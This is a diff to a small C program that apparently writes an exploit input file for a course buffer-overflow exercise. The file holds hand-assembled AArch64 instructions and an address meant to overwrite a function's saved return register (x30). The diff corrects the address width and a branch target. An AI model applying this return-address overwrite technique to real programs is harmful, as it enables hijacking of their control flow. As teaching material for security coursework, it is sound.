@@ -10,7 +10,7 @@ int main (void) {
     unsigned int uiAdrCmd;
     unsigned int uiStrbCmd;
     unsigned int uiBCmd;
-    unsigned int uiMovAdr;
+    unsigned long uiMovAdr;
 
     psFile = fopen("dataA", "w");
 
@@ -32,13 +32,13 @@ int main (void) {
     uiStrbCmd = MiniAssembler_strb(0, 1);
     fwrite(&uiStrbCmd, sizeof(unsigned int), 1, psFile);
 
-    /* 0x420184      | b 0x40089c  */
-    uiBCmd = MiniAssembler_b(0x40089c, 0x420184);
+    /* 0x420084      | b 0x40089c   */
+    uiBCmd = MiniAssembler_b(0x40089c, 0x420084);
     fwrite(&uiBCmd, sizeof(unsigned int), 1, psFile);
 
-    /* overwrite getName()'s x30 */
+    /* overwrite getName()'s x30 with address where mov command begins. */
     uiMovAdr = 0x420078;
-    fwrite(&uiMovAdr, sizeof(unsigned int), 1, psFile);
+    fwrite(&uiMovAdr, sizeof(unsigned long), 1, psFile);
 
     /* close the file */
     fclose(psFile);
